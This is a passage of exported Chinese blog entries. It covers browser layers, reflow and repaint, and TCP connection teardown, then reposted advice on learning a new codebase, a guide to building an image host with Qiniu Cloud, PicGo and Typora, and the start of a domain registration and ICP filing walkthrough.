<h4 id="创建图层"><a href="#创建图层" class="headerlink" title="创建图层"></a>创建图层</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;position_&quot;</span>&gt;</span>position<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box_3d&quot;</span>&gt;</span>3d变换<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;will-change&quot;</span>&gt;</span>will-change<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;transform&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">div &#123;width: 100px;height: 100px;&#125; .position_ &#123;background: pink;position: fixed;z-index: 20;&#125; .box_3d &#123;background:</span><br><span class="line">red;transform: translate3d(100px,30px,10px);&#125; .will-change &#123;background: #f12312;will-change: transform;&#125; .transform</span><br><span class="line">&#123;background: #302912;transform: skew(30deg, 20deg);&#125; 复制代码</span><br></pre></td></tr></table></figure>

<p>在 chrome 上查看 Layers. <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ca1b972d00684c8092bdc4dcaaf0eea0~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"> 如果没有打开 Layers,按下图打开： <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d21ec4951fc249e1b6e436d804af82c8~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<blockquote>
<p>知道图层的存在，我们可以手动打开一个图层，通过添加<code>transform: translateZ(0)</code> 这样回流和重绘的代价就小了，效率就会大大提高。但是不要滥用这个属性，否则会大大增加内存消耗。—— 开启 GPU 加速。</p>
</blockquote>
<h4 id="回流和重绘"><a href="#回流和重绘" class="headerlink" title="回流和重绘"></a>回流和重绘</h4><ul>
<li>重绘</li>
</ul>
<p>当页面中元素样式的改变并不影响它在文档流中的位置时（例如：color、background-color、visibility 等），浏览器会将新样式赋予给元素并重新绘制它，这个过程称为重绘。</p>
<ul>
<li>回流</li>
</ul>
<p>当 Render Tree 中部分或全部元素的尺寸、结构、或某些属性发生改变时，浏览器重新渲染部分或全部文档的过程称为回流。</p>
<blockquote>
<p>回流必将引起重绘，而重绘不一定会引起回流。</p>
</blockquote>
<p>引起回流：</p>
<ol>
<li>页面首次渲染</li>
<li>浏览器窗口大小发生改变</li>
<li>元素尺寸或位置发生改变</li>
<li>元素内容变化（文字数量或图片大小等等）</li>
<li>元素字体大小变化</li>
<li>添加或者删除可见的 DOM 元素</li>
<li>激活 CSS 伪类（例如：:hover）</li>
<li>查询某些属性或调用某些方法</li>
</ol>
<p>引起回流的属性和方法：</p>
<ul>
<li>clientWidth、clientHeight、clientTop、clientLeft</li>
<li>offsetWidth、offsetHeight、offsetTop、offsetLeft</li>
<li>scrollWidth、scrollHeight、scrollTop、scrollLeft</li>
<li>scrollIntoView()、scrollIntoViewIffNeeded()</li>
<li>getComputedStyle()</li>
<li>getBoundingClientRect()</li>
<li>scrollTo()</li>
</ul>
<h5 id="如何减少回流"><a href="#如何减少回流" class="headerlink" title="如何减少回流"></a>如何减少回流</h5><ul>
<li>css</li>
</ul>
<ol>
<li>避免使用 table 布局;</li>
<li>尽可能在 DOM 树的最末端改变 class;</li>
<li>避免设置多层内联样式;</li>
<li>将动画效果应用到 position 属性为 absolute 或 fixed 的元素上;</li>
<li>避免使用 CSS 表达式（例如：calc()）。</li>
</ol>
<ul>
<li>JS</li>
</ul>
<ol>
<li>避免频繁操作样式，最好一次性重写 style 属性，或者将样式列表定义为 class 并一次性更改 class 属性。</li>
<li>避免频繁操作 DOM，创建一个 documentFragment，在它上面应用所有 DOM 操作，最后再把它添加到文档中。</li>
<li>也可以先为元素设置 display: none，操作结束后再把它显示出来。因为在 display 属性为 none 的元素上进行的 DOM 操作不会引发回流和重绘。</li>
<li>避免频繁读取会引发回流&#x2F;重绘的属性，如果确实需要多次使用，就用一个变量缓存起来。</li>
<li>对具有复杂动画的元素使用绝对定位，使它脱离文档流，否则会引起父元素及后续元素频繁回流。</li>
</ol>
<h2 id="第六部分-断开连接：TCP-四次分手"><a href="#第六部分-断开连接：TCP-四次分手" class="headerlink" title="第六部分 断开连接：TCP 四次分手"></a>第六部分 断开连接：TCP 四次分手</h2><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e465eb2997084086947fdaa053edb210~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<ol>
<li>刚开始双方都处于 established 状态，假如是客户端先发起关闭请求</li>
<li>第一次挥手：客户端发送一个 FIN 报文，报文中会指定一个序列号。此时客户端处于 FIN_WAIT1 状态</li>
<li>第二次挥手：服务端收到 FIN 之后，会发送 ACK 报文，且把客户端的序列号值+1 作为 ACK 报文的序列号值，表明已经收到客户端的报文了，此时服务端处于 CLOSE_WAIT 状态</li>
<li>第三次挥手：如果服务端也想断开连接了，和客户端的第一次挥手一样，发送 FIN 报文，且指定一个序列号。此时服务端处于 LAST_ACK 的状态</li>
<li>需要过一阵子以确保服务端收到自己的 ACK 报文之后才会进入 CLOSED 状态，服务端收到 ACK 报文之后，就处于关闭连接了，处于 CLOSED 状态。</li>
</ol>
<h3 id="挥手为什么需要四次？"><a href="#挥手为什么需要四次？" class="headerlink" title="挥手为什么需要四次？"></a>挥手为什么需要四次？</h3><p>因为当服务端收到客户端的 SYN 连接请求报文后，可以直接发送 SYN+ACK 报文。其中 ACK 报文是用来应答的，SYN 报文是用来同步的。但是关闭连接时，当服务端收到 FIN 报文时，很可能并不会立即关闭 SOCKET，所以只能先回复一个 ACK 报文，告诉客户端，“你发的 FIN 报文我收到了”。只有等到我服务端所有的报文都发送完了，我才能发送 FIN 报文，因此不能一起发送。故需要四次挥手。</p>
<h3 id="为什么客户端发送-ACK-之后不直接关闭，而是要等一阵子才关闭？"><a href="#为什么客户端发送-ACK-之后不直接关闭，而是要等一阵子才关闭？" class="headerlink" title="为什么客户端发送 ACK 之后不直接关闭，而是要等一阵子才关闭？"></a>为什么客户端发送 ACK 之后不直接关闭，而是要等一阵子才关闭？</h3><p>客户端收到服务端的连接释放报文段后，对此发出确认报文段（ACK&#x3D;1，seq&#x3D;u+1，ack&#x3D;w+1），客户端进入 TIME_WAIT（时间等待）状态。此时 TCP 未释放掉，需要经过时间等待计时器设置的时间 2MSL 后，客户端才进入 CLOSED 状态。如果不等待，客户端直接跑路，当服务端还有很多数据包要给客户端发，且还在路上的时候，若客户端的端口此时刚好被新的应用占用，那么就接收到了无用数据包，造成数据包混乱。</p>
<h3 id="为什么-TIME-WAIT-状态需要经过-2MSL（最大报文生存时间）才能返回到-CLOSE-状态？"><a href="#为什么-TIME-WAIT-状态需要经过-2MSL（最大报文生存时间）才能返回到-CLOSE-状态？" class="headerlink" title="为什么 TIME_WAIT 状态需要经过 2MSL（最大报文生存时间）才能返回到 CLOSE 状态？"></a>为什么 TIME_WAIT 状态需要经过 2MSL（最大报文生存时间）才能返回到 CLOSE 状态？</h3><p>理论上，四个报文都发送完毕，就可以直接进入 CLOSE 状态了，但是可能网络是不可靠的，有可能最后一个 ACK 丢失。所以 TIME_WAIT 状态就是用来重发可能丢失的 ACK 报文。 1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端； 1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达。</p>
<h2 id="关于-HTTP"><a href="#关于-HTTP" class="headerlink" title="关于 HTTP"></a>关于 HTTP</h2><p>如果想要高清大图或者 Xmind 文件的话，可以私信 lian x <img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cbaee46a802a4722b7fb990f299f51f7~tplv-k3u1fbpfcp-zoom-in-crop-mark:1304:0:0:0.awebp" alt="img"></p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://link.juejin.cn/?target=https://www.infoq.cn/article/whcobxfbgtphy7ijv1kp">5 分钟看懂 HTTP3</a><br>[2] <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/158593966">一文带你了解 https</a><br>[3] <a href="https://link.juejin.cn/?target=https://github.com/ljianshu/Blog/issues/24">从 url 输入到页面展现到底发生什么？</a><br>[4] <a href="https://juejin.cn/post/6844903784229896199">从 url 输入到页面展现到底发生什么？</a><br>[5] <a href="https://link.juejin.cn/?target=https://blog.csdn.net/Hanani_Jia/article/details/83036051">在浏览器上请求一个 url 的全部过程</a><br>[6] <a href="https://link.juejin.cn/?target=https://segmentfault.com/a/1190000006879700">前端经典面试题: 从输入 URL 到页面加载发生了什么？</a><br>[7] <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/60950750">浏览器缓存看这一篇就够了</a><br>[8] <a href="https://link.juejin.cn/?target=https://nyimac.gitee.io/2020/12/10/URL%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B5%81%E7%A8%8B/">从输入 URL 到浏览器显示页面的流程</a><br>[9] <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/80551769">在浏览器输入 URL 回车之后发生了什么（超详细版）</a><br>[10] <a href="https://link.juejin.cn/?target=https://my.oschina.net/yzbty32/blog/549305">TCP 和 Http 的区别!我都搞懂了,你就别迷糊了!</a><br>[11] <a href="https://link.juejin.cn/?target=https://draveness.me/whys-the-design-https-latency/">为什么 HTTPS 需要 7 次握手以及 9 倍时延</a><br>[12] <a href="https://link.juejin.cn/?target=https://developers.google.com/web/fundamentals/performance/critical-rendering-path/render-tree-construction?hl=zh-cn">渲染树构建、布局及绘制</a><br>[13] <a href="https://link.juejin.cn/?target=https://www.cnblogs.com/feng9exe/p/10907959.html">浏览器渲染详细过程：重绘、重排和 composite 只是冰山一角</a><br>[14] <a href="https://link.juejin.cn/?target=https://yeungkc.com/web-reflow-and-repaint/">浏览器渲染机制和 Reflow（回流、重排）和 Repaint（重绘）</a><br>[15] <a href="https://link.juejin.cn/?target=https://segmentfault.com/a/1190000038468748">问我 Chrome 浏览器的渲染原理（6000 字长文）</a><br>[16] <a href="https://link.juejin.cn/?target=https://blog.csdn.net/fesfsefgs/article/details/105918451">浅谈浏览器的图层与重绘重排（详细），以及如何用于性能优化</a><br>[17] <a href="https://link.juejin.cn/?target=https://abelsu7.top/2018/10/18/http-notes-part-1/">HTTP 笔记 1：Web 基础及简单的 HTTP 协议</a><br>[18] <a href="https://link.juejin.cn/?target=https://pic.liaoyongfu.com/2019/1028/%E5%9B%BE%E8%A7%A3HTTP-21%E5%BC%A0%E5%9B%BE%E6%8A%8AHTTP%E5%AE%89%E6%8E%92%E5%BE%97%E6%98%8E%E6%98%8E%E7%99%BD%E7%99%BD.pdf">图解 HTTP-21 张图把 HTTP 安排得明明白白</a><br>[19] <a href="https://link.juejin.cn/?target=https://http3-explained.haxx.se/zh/zh">HTTP3</a><br>[20] <a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/158593966">一文带你了解 HTTPS</a><br>[21] <a href="https://link.juejin.cn/?target=https://blog.poetries.top/browser-working-principle/guide/part1/lesson01.html%23%E6%97%A9%E6%9C%9F%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84">浏览器工作原理与实践</a></p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>刚入职新公司，代码看懵逼了咋办</title>
    <url>/2022/03/25/20220325-%E5%88%9A%E5%85%A5%E8%81%8C%E6%96%B0%E5%85%AC%E5%8F%B8%EF%BC%8C%E4%BB%A3%E7%A0%81%E7%9C%8B%E6%87%B5%E9%80%BC%E4%BA%86%E5%92%8B%E5%8A%9E%E5%88%9A%E5%85%A5%E8%81%8C%E6%96%B0%E5%85%AC%E5%8F%B8%EF%BC%8C%E4%BB%A3%E7%A0%81%E7%9C%8B%E6%87%B5%E9%80%BC%E4%BA%86%E5%92%8B%E5%8A%9E/</url>
    <content><![CDATA[<p>我今天刚刚入职一家公司实习，需要熟悉已有的项目代码。因为是第一次接触已上线的工程代码、且代码量超级大，所以把我看懵逼了。想问下应该怎么快速熟悉代码呢？这个问题可太真实了，让我瞬间回想起自己进第一家公司实习时的 “恐惧” 。</p>
<span id="more"></span>

<div class="note info"><p>文章转载自程序员鱼皮 </p>
</div>

<p>面对前人堆积的屎山代码、复杂的业务流程图，我当时心里只有一个念头：我要回家！</p>
<p>不过随着自己读过的、写过的代码越来越多，感觉上手新项目也越来越迅速了。下面给大家分享我的一点经验：如果给我一个新项目，我会怎么看？</p>
<h2 id="如何快速上手新项目"><a href="#如何快速上手新项目" class="headerlink" title="如何快速上手新项目"></a>如何快速上手新项目</h2><p>我觉得可以遵循以下几个步骤：</p>
<h3 id="获取项目相关信息"><a href="#获取项目相关信息" class="headerlink" title="获取项目相关信息"></a>获取项目相关信息</h3><p>进入一家新公司后，如果遇到不负责任的同事呢，可能直接甩给你项目地址，然后就让你自己研究了。这就好比产品经理直接甩给你一个需求让你直接上线一样，怎么实现我不管。</p>
<p>这种情况下，我们首先要做的事情是尽可能多地获取项目相关信息，来帮助自己了解项目。比如项目介绍文档、项目功能说明文档、业务流程图、项目历史迭代情况、项目架构文档、技术选型背景等等。</p>
<p>像我的话，就会询问同事：这个项目背景是什么呀？这个项目有没有啥文档呀？之类的。</p>
<p>不过有些公司或项目可能过于敏捷，平时光做需求，不写文档，逻辑全靠口口相传！</p>
<p>也没关系，请同事给你介绍一下项目的业务和技术信息就好。</p>
<p>刚进公司有问题一定不能憋着，要多问，让自己尽可能多地了解项目代码之外的东西。</p>
<h3 id="了解业务流程"><a href="#了解业务流程" class="headerlink" title="了解业务流程"></a>了解业务流程</h3><p>技术是为业务服务的，千万不要连自己项目是干嘛的、有什么功能、为什么要做这个功能都不知道，就去看代码、想着快速把需求完成。最好不要把自己当成临时工，而是要当成项目的 <strong>负责人</strong> 。</p>
<p>我的话一般会先阅读文档或者请同事来给我介绍项目的 <strong>背景</strong> ，即为什么要做这个东西；然后对着产品本身（可能是网页或者 APP）来体验项目的功能；最后再重点关注自己要做的业务、负责的功能模块，了解它的历史、业务逻辑等。</p>
<p>整体的思想就是从整体到局部，由大到小吧。</p>
<p>这里为什么我反复强调要了解项目的背景呢？聪明的朋友一定能想到。因为你刚进一家新公司或者一个新项目，如果自己啥都不懂，别人说啥你就做啥，就很有可能出现这个项目 &#x2F; 功能本身根本没有任何意义、你只是帮忙收拾了个烂摊子的情况。。。</p>
<h3 id="阅读项目文档"><a href="#阅读项目文档" class="headerlink" title="阅读项目文档"></a>阅读项目文档</h3><p>阅读公司的项目过程其实和阅读开源项目是一样的，基本上项目的代码仓库都会有一个 <code>README.md</code> 文件。</p>
<p>这个文件往往会介绍项目的背景、功能、技术栈、如何启动、如何贡献代码等等。</p>
<p>我会先整体扫一遍文档的 <strong>目录</strong> ，然后优先关注项目的技术栈以及如何启动。</p>
<p>一般 GitHub 等项目平台都会帮你生成文档目录，可以很快地跳转。也可以把文档下载到本地，用 Typora 之类的 Markdown 编辑器打开，从而清晰地看到文档的目录。</p>
<p>因为如果你了解了项目用到的技术，而你正好会用这个技术的话，心里就多了几分底气，项目的架构也能大致了解了，后面再去看代码就轻松地一批。</p>
<p>举个例子，看到技术栈中出现了 Ant Design Pro，我正好用过！我就知道这个项目大概率使用了 React、Ant Design、Webpack、Dva、Umi 等技术了，它的代码结构如何、配置文件在哪里、页面文件在哪里、如何启动也差不多能 get 到。</p>
<p>像我平时在 GitHub 上找开源项目时，除了功能外，就是关注技术栈，如果项目文档中提到的技术我都会用，那么我就很有自信这个项目我肯定能学的动、学得懂。</p>
<p>所以这也是为什么要多了解和积累一些技术。</p>
<p>补充一下，如果作者没在文档中写明技术栈怎么办？这里有个小技巧，去看项目的依赖管理文件，比如前端的 <code>package.json</code> 、Java 的 <code>pom.xml</code> 或 <code>build.gradle</code> 等。</p>
<h3 id="先把项目跑起来"><a href="#先把项目跑起来" class="headerlink" title="先把项目跑起来"></a>先把项目跑起来</h3><p>关于这点没什么好说的，先把代码拉下来、安装依赖、按照文档把项目跑起来，才能更好地了解和调试项目。</p>
<p>比较麻烦的点可能就是环境的搭建，比如本地安装 MySQL、Nginx 代理之类的。不过现在很多公司也会采用开发机、或者远程开发环境的模式，直接连接某个远程库就好了，能省很多事儿，也可以请教一下同事怎么搭建环境比较方便。</p>
<h3 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h3><p>终于到了读代码的环节，建议大家遵循两个原则：</p>
<ul>
<li><p>由整体到局部：先了解整个项目的目录结构，每个目录都是做什么的，比如在哪里写页面？在哪里改配置？在哪里改接口？怎么切换环境等。</p>
<p>还要了解项目的模块划分，比如哪些代码是用户模块、哪些代码是订单模块，可以通过 JetBrains 等开发工具来自动生成 UML 类图，更清晰地了解。</p>
</li>
<li><p>结合业务：读代码的时候尽量不要裸读、按顺序读，而是可以配合系统去定位代码。比如阅读用户登录功能的后端代码时，可以在前端执行一次登录，然后在浏览器 F12 网络请求中找到登录对应的后端请求，再到代码中全局搜索这个请求即可。阅读用户下订单的代码时，可以先在前端模拟一次下单操作，了解整个过程，从而更好地理解请求之间的顺序和依赖关系。</p>
</li>
</ul>
<h3 id="上手开发"><a href="#上手开发" class="headerlink" title="上手开发"></a>上手开发</h3><p>最后也是最关键的一点，读代码不能只读代码，一定要多上手去写、去执行、去调试。</p>
<p>必要时可以专门新建一个分支，在这个分支里无论怎么 “为所欲为” 都不会影响到正常已上线的代码。可以自己复制代码去执行一遍、自己给代码流程加上一些日志来帮助理解数据流转过程、或者 Debug 调试等。</p>
<p>其实刚进一家新公司时通常不会给你安排太复杂的工作，基本就是增删改查、或者给你一个小页面小功能去做，帮助你熟悉代码。有些时候，哪怕你不理解整个项目的架构，通过复制同事已经写过的代码也能完成工作。不过还是建议大家，为了长远的发展，不要只局限于自己负责的小功能，可以多了解系统的上下游和整体架构，提高自己的全局观。</p>
]]></content>
      <categories>
        <category>经典文章</category>
      </categories>
      <tags>
        <tag>职场</tag>
      </tags>
  </entry>
  <entry>
    <title>七牛云+PicGo+Typora搭建图床</title>
    <url>/2022/04/01/20220401-%E4%B8%83%E7%89%9B%E4%BA%91+PicGo+Typora%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="配置七牛云"><a href="#配置七牛云" class="headerlink" title="配置七牛云"></a>配置七牛云</h2><blockquote>
<p>文章中涉及的域名来自<a href="https://cloud.tencent.com/">腾讯云</a></p>
</blockquote>
<h3 id="为什么选择七牛云"><a href="#为什么选择七牛云" class="headerlink" title="为什么选择七牛云"></a>为什么选择七牛云</h3><p>注册用户送免费 10G 空间，它不香吗？要知道，gitee 也才送 5 个 G。</p>
<h3 id="新建存储空间"><a href="#新建存储空间" class="headerlink" title="新建存储空间"></a>新建存储空间</h3><p><img src="https://cdn.huatree.top/image-20220401151047795.png" alt="image-20220401151047795"></p>
<p>根据要求填写，存储区域如果选择国内的，后面的自定义域名填写时，就必须保证该域名是已通过审核状态。</p>
<p><img src="https://cdn.huatree.top/image-20220401151806541.png" alt="image-20220401151806541"></p>
<h3 id="绑定自定义域名"><a href="#绑定自定义域名" class="headerlink" title="绑定自定义域名"></a>绑定自定义域名</h3><p><img src="https://cdn.huatree.top/image-20220401152045293.png" alt="image-20220401152045293"></p>
<p>在自定义源站域名栏绑定域名</p>
<p><img src="https://cdn.huatree.top/image-20220401153548043.png" alt="image-20220401153548043"></p>
<blockquote>
<p>! 注意</p>
<p>如果是国内服务器，输入域名时必须是已通过备案域名</p>
</blockquote>
<h4 id="配置域名映射（CNAME）"><a href="#配置域名映射（CNAME）" class="headerlink" title="配置域名映射（CNAME）"></a>配置域名映射（CNAME）</h4><p>绑定域名成功后，复制 CNAME，到域名申请的所在平台，配置域名的 CNAME。</p>
<p><img src="https://cdn.huatree.top/image-20220401154840145.png" alt="image-20220401154840145"></p>
<p>这里域名申请平台，以腾讯云为例，点击管理解析，进入记录管理页</p>
<p><img src="https://cdn.huatree.top/image-20220401155255504.png" alt="image-20220401155255504"></p>
<p>点击快速添加解析，选择网站解析-域名映射，咱贴在七牛云那儿复制的 CNAME 值</p>
<p><img src="https://cdn.huatree.top/image-20220401155701085.png" alt="image-20220401155701085"></p>
<h4 id="配置-HTTPS"><a href="#配置-HTTPS" class="headerlink" title="配置 HTTPS"></a>配置 HTTPS</h4><p>进入空间管理-域名管理，找到自定义源站域名栏</p>
<p><img src="https://cdn.huatree.top/image-20220401165418098.png" alt="image-20220401165418098"></p>
<p>访问控制，开启 https，上传新 SSL 证书，SSL 证书可通过申请过域名的平台免费获取。</p>
<p>腾讯云上可申请免费SSL证书，推荐添加一个<strong>子域名</strong>来作为七牛云存储空间映射的自定义域名，这样不会影响主域名的解析。如果主域名作为了七牛云存储空间映射的自定义域名，且主域名映射了记录值，这个记录值的解析访问会收到影响。</p>
<p>影响如：申请免费SSL证书时，用了主域名，百度智能云上的ICP备案，网站会使用这个域名的DNS解析，默认访问<code>https://主域名</code>或<code>https://www.主域名</code>，其中<code>https://主域名</code>解析错误，过不了多久，就会收到百度智能云发的邮箱或电话告知网站无法访问须整改。</p>
<p><img src="https://cdn.huatree.top/image-20220401165507134.png" alt="image-20220401165507134"></p>
<p>证书下载时，选择 Nginx。点击 “上传自有证书”，使用编辑器打开后续文件，并复制 .pem 后缀的文件内容到证书内容 （公钥），复制 .key 后缀结尾的内容到 证书私钥就行了。最后，别忘了回来选择刚上传的证书。</p>
<h2 id="配置-PicGo"><a href="#配置-PicGo" class="headerlink" title="配置 PicGo"></a>配置 PicGo</h2><h3 id="下载安装-PicGo"><a href="#下载安装-PicGo" class="headerlink" title="下载安装 PicGo"></a>下载安装 PicGo</h3><p>选择稳定版本，<a href="https://github.com/Molunerfinn/picgo/releases">下载详见</a>。</p>
<h3 id="界面配置"><a href="#界面配置" class="headerlink" title="界面配置"></a>界面配置</h3><p>选择七牛云图床，AccessKey&#x2F;SecretKey 值可从七牛云&gt;个人中心&gt;密钥管理复制。设定存储空间名来自七牛云-空间管理中的空间名称。设定访问网址来自七牛云-空间管理-文件管理中的外链域名。确认存储区域值来自七牛云存储区域对应 ID 值，<a href="https://developer.qiniu.com/kodo/1671/region-endpoint-fq">详见</a>。</p>
<p><img src="https://cdn.huatree.top/image-20220401170955343.png" alt="image-20220401170955343"></p>
<h2 id="配置-Typora"><a href="#配置-Typora" class="headerlink" title="配置 Typora"></a>配置 Typora</h2><p>进入文件-偏好设置，选择 PicGo 及其安装路径。</p>
<p><img src="https://cdn.huatree.top/image-20220401172028839.png" alt="image-20220401172028839"></p>
<p>最后，可以验证一下图片上传。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://gitee.com/help/articles/4125">Gitee 使用配额说明</a></p>
<p>[2] <a href="https://picgo.github.io/PicGo-Doc/zh/guide/">PicGo 指南</a></p>
<p>[3] <a href="https://developer.qiniu.com/kodo/1671/region-endpoint-fq">七牛云-存储区域</a></p>
<p>[4] <a href="https://support.typora.io/Upload-Image/#picgoapp-chinese-language-only">Typora 上传图片说明</a></p>
<p>[5] <a href="https://juejin.cn/post/7219968440761942077">七牛云使用自定义域名</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>七牛云</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>从域名到云服务器入坑</title>
    <url>/2022/04/01/20220401-%E4%BB%8E%E5%9F%9F%E5%90%8D%E5%88%B0%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E5%9D%91/</url>
    <content><![CDATA[<p>本文以腾讯云平台申请域名为例，为首次申请域名的用户提供便捷。</p>
<p><img src="https://cdn.huatree.top/image-20220828170633379.png" alt="image-20220828170633379"></p>
<span id="more"></span>

<div class="note info"><p>文章里的域名申请平台来自<a href="**https://cloud.tencent.com/**"><strong>腾讯云</strong></a></p>
</div>

<h2 id="为什么需要域名"><a href="#为什么需要域名" class="headerlink" title="为什么需要域名"></a>为什么需要域名</h2><p>这还得从搭建个人博客说起。当初搭建博客，选的 Hexo + github 组合（为什么没选 gitee，因为 gitee 平台的文件审核太折腾了）。Hexo 打包的静态资源通过 Github 托管和发布，这里用到了 Github Pages。了解更多 Github Pages，详见<em>参考 1</em>。</p>
<p>部署好的静态资源 Web 可以通过<code>https://user.github.io</code>访问。<code>user</code>即 Github 账户名。</p>
<p>图床则采用<code>Github + PicGo + https://cdn.jsdelivr.net</code>。</p>
<p>就这样，个人博客持续了一段时间。感觉没有个性化域名无法凸显个人博客的魅力，一时间上头，就想着搞个域名。恰逢其时，腾讯云出了优惠活动，就注册了个域名。</p>
<h2 id="域名注册"><a href="#域名注册" class="headerlink" title="域名注册"></a>域名注册</h2><p>获得域名的方式是通过付费获得域名一年或多年内的使用权，我们称之为域名注册。</p>
<p>按照国际惯例，域名申请遵循 “先申请，先服务” 的原则。由于域名不允许重名，一个域名只能对应一台计算机主机，一个域名一旦被申请，注册期内该域名属于申请者，除非申请者自动放弃或转让。建议您及时申请属于自己的专属域名。</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>操作步骤</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>创建域名信息模板</td>
<td><a href="https://console.cloud.tencent.com/domain/template">进入域名信息模板页-新建模板</a></td>
</tr>
<tr>
<td>2</td>
<td>查看域名价格</td>
<td><a href="https://buy.cloud.tencent.com/domain/price?type=overview">腾讯云平台-域名价格表</a></td>
</tr>
<tr>
<td>3</td>
<td>域名注册</td>
<td>请您登录 <a href="https://dnspod.cloud.tencent.com/">域名注册页面</a>，选择您需要的域名后缀，添加购物车，填写您的域名信息并完成支付后，进入下一步实名认证的操作。</td>
</tr>
<tr>
<td>4</td>
<td>实名认证</td>
<td>新注册域名使用已实名的信息模板注册域名后不需要再提交实名认证。具体操作请参考 <a href="https://cloud.tencent.com/document/product/242/6707">实名认证</a>。</td>
</tr>
</tbody></table>
<h2 id="关联域名指向-Github-Pages"><a href="#关联域名指向-Github-Pages" class="headerlink" title="关联域名指向 Github Pages"></a>关联域名指向 Github Pages</h2><p>需要在 Hexo 创建一个 CNAME 文件，内容为域名。然后在腾讯云管理平台上访问 DNS 解析 DNSPod，添加记录，绑定记录值（即<code>user.github.io</code>）保存生效。最后在 Gihub 对应的博客仓库 Settings&gt;pages 中设置自定义域名，检索生效。</p>
<h2 id="备案域名"><a href="#备案域名" class="headerlink" title="备案域名"></a>备案域名</h2><p><strong>备案域名只是网站备案中的一个环节</strong>，后面还有备案云服务器。不要理解为把域名脱离出来单独备案。</p>
<p>备案域名是一个很耗时的事儿，审核运气不好的话，长达一个月审核期。我有域名的博客好端端的，为什么需要备案域名呢？其实，是嫌弃 github 访问博客时慢时好，图片加载也不稳定，就选了个七牛云搭建图床（因为免费送 10 个 G，被它吸引了一波）。没想到的是，七牛云搭建图床，要求必须有备案过的域名才能使用。麻了，接着就去腾讯云文档了解备案域名的信息了。</p>
<p>备案域名，需要走完网站备案所有流程，其中需要提供云服务器。接着去折腾了下腾讯云服务器，总算满足前提条件了。</p>
<h3 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h3><p>网站由 3 部分组成：域名、源代码、虚拟主机。</p>
<p><strong>域名</strong>：</p>
<p>在 Internet 上有千百万台主机，为了区分这些主机，每一台主机都被分配一个 IP 地址。但由于 IP 地址没有实际意义且难于记忆，于是就有了域名（Domain Name）。<a href="https://cloud.tencent.com/document/product/242/8569">更多详见</a></p>
<p><strong>源代码</strong>:</p>
<p>是指未编译的文本代码或一个网站的全部源码文件，是一系列人类可读的计算机语言指令。我们可以把它理解成源文代码，当前看到的这个网页来说，其实它是由一大堆的源代码组成，通过我们浏览器（如微软的 IE 浏览器，谷歌的 Chrome 浏览器等）或服务器翻译成我们所看到的样子。</p>
<p><strong>虚拟主机</strong>:</p>
<p>虚拟主机，可以理解为服务器。用来放置网站内容、文件和详细资料的空间，也就是可以囊括网站所有网页、文字、文档、图片、数据库等大量文件的地方。对于许多中小企业来说，建网站时一般都会用到虚拟主机来建设网站。</p>
<h3 id="备案"><a href="#备案" class="headerlink" title="备案"></a>备案</h3><p>如果有网站，并且是国内（非港澳台）的服务器，则需要网站备案。其他情况，无需备案。网站备案操作如下：</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>操作步骤</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>网站备案</td>
<td>如果您是首次备案，请参考 <a href="https://cloud.tencent.com/document/product/243/37402">小程序首次备案</a>或<a href="https://cloud.tencent.com/document/product/243/18958">PC 端首次备案</a></td>
</tr>
<tr>
<td>2</td>
<td>域名解析</td>
<td>您通过输入域名访问网站时，将域名解析到对应的 IP，找到对应服务器，打开对应的访问页面。网站域名解析请参考 <a href="https://cloud.tencent.com/document/product/302/3446">快速添加域名解析</a>。</td>
</tr>
</tbody></table>
<blockquote>
